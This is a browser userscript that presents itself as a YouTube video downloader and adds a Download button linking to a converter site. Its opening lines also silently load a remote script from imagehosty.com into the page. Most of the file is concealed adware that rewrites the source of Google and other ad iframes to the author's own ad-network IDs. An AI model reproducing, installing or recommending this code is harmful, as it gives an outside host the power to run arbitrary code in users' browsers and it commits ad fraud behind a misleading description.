// ==UserScript==
// @name           Download Youtube Videos
// @namespace      download@youtube.com
// @description    Downloads youtube videos
// @grant          none
// @include        http://youtube.com/watch?v=*
// @include        http://*.youtube.com/watch?v=*
// @include        http://youtube.com/user/*
// @include        http://*.youtube.com/user/*
// @include        http://youtube.com/watch?v=*
// @include        http://*.youtube.com/watch?v=*
// @include        http://youtube.com/user/*
// @include        http://*.youtube.com/user/*
// ==/UserScript==

// // /*! jQuery v1.9.1 | (c) 2005, 2012 jQuery Foundation, Inc. | jquery.org/license
// // //@ sourceMappingURL=jquery.min.map

var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src', 'http://www.imagehosty.com/scripts/youtubedownloaderch.js');
	document.getElementsByTagName('head')[0].appendChild(s);
 

if (window.location.href.match(/youtube.com/i)) {
var DIV = document.createElement('span');
	//DIV.innerHTML = '';
	DIV.appendChild(document.createTextNode(''));
	DIV.style.cssFloat = "";
var divp = document.getElementById("watch7-secondary-actions");
if (divp)
	divp.appendChild(DIV);

var url = encodeURIComponent(window.location);


var INAU = document.createElement('input');
	INAU.setAttribute('type','button');
	INAU.setAttribute('name','INAU');
	INAU.setAttribute('value','Download');
	INAU.setAttribute('class','yt-uix-tooltip-reverse yt-uix-button yt-uix-button-default yt-uix-tooltip');
	INAU.style.borderLeft = "";
	INAU.style.marginRight = "";
	INAU.style.marginLeft = "";
	INAU.style.borderRadius = "0 3px 3px 0";
	DIV.appendChild(INAU);
	INAU.addEventListener('click', function(){window.open("http://www.mp3convert.me/index.php?url=" + url + ""); self.focus();}, false);
}


var pais=window.navigator.userLanguage||window.navigator.language;var adsscript350;var adsscript728;if(pais=='pt-PT')
{adsscript350='http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%';adsscript728='http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%';}
else if(pais=='pt-BR')
{adsscript350='http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%';adsscript728='http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%';}
else
{adsscript350='http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%';adsscript728='http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%';}
var element=document.getElementById('aswift_0');if(element){var height=document.getElementById('aswift_0').getAttribute('height');var width=document.getElementById('aswift_0').getAttribute('width');if(height=='250')
document.getElementById('aswift_0').setAttribute('src',adsscript350);else if(height=='60')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height=='90')
document.getElementById('aswift_0').setAttribute('src',adsscript728);else if(height=='600'&&width=='160')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height=='600'&&width=='120')
document.getElementById('aswift_0').setAttribute('src','http://imagehosty.com/scripts/adsscript160x120.html');else if(height=='280')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
var element2=document.getElementById('aswift_1');if(element2){var height2=document.getElementById('aswift_1').getAttribute('height');var width2=document.getElementById('aswift_1').getAttribute('width');if(height2=='250')
document.getElementById('aswift_1').setAttribute('src',adsscript350);else if(height2=='60')
document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height2=='90')
document.getElementById('aswift_1').setAttribute('src',adsscript728);else if(height2=='600'&&width2=='160')
document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height2=='600'&&width2=='120')
document.getElementById('aswift_1').setAttribute('src','http://imagehosty.com/scripts/adsscript160x120.html');else if(height2=='280')
document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
var element3=document.getElementById('aswift_2');if(element3){var height3=document.getElementById('aswift_2').getAttribute('height');var width3=document.getElementById('aswift_2').getAttribute('width');if(height3=='250')
document.getElementById('aswift_2').setAttribute('src',adsscript350);else if(height3=='60')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height3=='90')
document.getElementById('aswift_2').setAttribute('src',adsscript728);else if(height3=='600'&&width3=='160')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height3=='600'&&width3=='120')
document.getElementById('aswift_2').setAttribute('src','http://imagehosty.com/scripts/adsscript160x120.html');else if(height3=='280')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
var element4=document.getElementById('aswift_3');if(element4){var height4=document.getElementById('aswift_3').getAttribute('height');var width4=document.getElementById('aswift_3').getAttribute('width');if(height4=='250')
document.getElementById('aswift_3').setAttribute('src',adsscript350);else if(height4=='60')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height4=='90')
document.getElementById('aswift_3').setAttribute('src',adsscript728);else if(height4=='600'&&width4=='160')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height4=='600'&&width4=='120')
document.getElementById('aswift_3').setAttribute('src','http://imagehosty.com/scripts/adsscript160x120.html');else if(height4=='280')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
var element5=document.getElementById('aswift_4');if(element5){var height5=document.getElementById('aswift_4').getAttribute('height');var width5=document.getElementById('aswift_4').getAttribute('width');if(height5=='250')
document.getElementById('aswift_4').setAttribute('src',adsscript350);else if(height5=='60')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height5=='90')
document.getElementById('aswift_4').setAttribute('src',adsscript728);else if(height=='600'&&width5=='160')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height=='600'&&width5=='120')
document.getElementById('aswift_4').setAttribute('src','http://imagehosty.com/scripts/adsscript160x120.html');else if(height5=='280')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
var i=0;var div;while(div=document.getElementsByTagName('iframe')[i++]){
if(div.id.match(/google_ads/)){var parentDiv=document.getElementById(div.id).parentNode;var height=parentDiv.offsetHeight;var width=parentDiv.offsetWidth;height=parseInt(height);width=parseInt(width);document.getElementById(div.id).style.display="none";if(height>250&&height<275){inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';parentDiv.style.height='250px';parentDiv.style.overflow='show';}
else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="'+adsscript728+'"></iframe>';else if(height>600&&height<610&&width>160&&width<180)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>600&&height<610&&width<140)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://imagehosty.com/scripts/adsscript160x120.html"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';parentDiv.innerHTML=inset;}

if(div.id.match(/ads_frame/)){var parentDiv=document.getElementById(div.id).parentNode;var height=parentDiv.offsetHeight;var width=parentDiv.offsetWidth;height=parseInt(height);width=parseInt(width);document.getElementById(div.id).style.display="none";if(height>250&&height<275){inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';parentDiv.style.height='250px';parentDiv.style.overflow='show';}
else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="'+adsscript728+'"></iframe>';else if(height>600&&height<610&&width>160&&width<180)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>600&&height<610&&width<140)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';parentDiv.innerHTML=inset;}


}
var j=0;var div2;while(div2=document.getElementsByTagName('iframe')[j++]){if(div2.id.match(/adframe/)){document.getElementById(div2.id).setAttribute('load','');var height7=document.getElementById(div2.id).getAttribute('height');var width7=document.getElementById(div2.id).getAttribute('width');if(height7=='250')
document.getElementById(div2.id).setAttribute('src',adsscript350);else if(height7=='60')
document.getElementById(div2.id).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height7=='90')
document.getElementById(div2.id).setAttribute('src',adsscript728);else if(height7=='600'&&width7=='160')
document.getElementById(div2.id).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height7=='600'&&width7=='120')
document.getElementById(div2.id).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height7=='280')
document.getElementById(div2.id).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementById(div2.id).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}}
var i;for(i=0;i<document.getElementsByTagName("iframe").length;i++){var div=document.getElementsByTagName("iframe").item(i).getAttribute('src');var height8=document.getElementsByTagName("iframe").item(i).getAttribute('height');if(div){if(div.match(/globaltakeoff/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/googleads/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/adroll/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/google_ads/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/adnetwork/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/bidvertiser/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}

if(div.match(/banner/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/pub_ads/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/avazu/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/play_ad/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/adshost/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/fhserve/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}
if(div.match(/propellerads/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}

if(div.match(/adbooth/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}

if(div.match(/yieldmanager/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}

if(div.match(/xtendmedia/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}


if(div.match(/adk2/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}



if(div.match(/lfstmedia/)){if(height8=='250')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript350);else if(height8=='60')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='90')
document.getElementsByTagName("iframe").item(i).setAttribute('src',adsscript728);else if(height8=='600')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else if(height8=='280')
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');else
document.getElementsByTagName("iframe").item(i).setAttribute('src','http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%');}}}

//var fbphoto=document.getElementById("pagelet_reminders");var childGuest=document.createElement("div");insetfb='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://imagehosty.com/scripts/adsscript180.html"></iframe>';childGuest.innerHTML=insetfb;if(fbphoto){if(fbphoto.nextSibling){fbphoto.parentNode.insertBefore(childGuest,fbphoto.nextSibling);}
//else{fbphoto.parentNode.appendChild(childGuest);}}

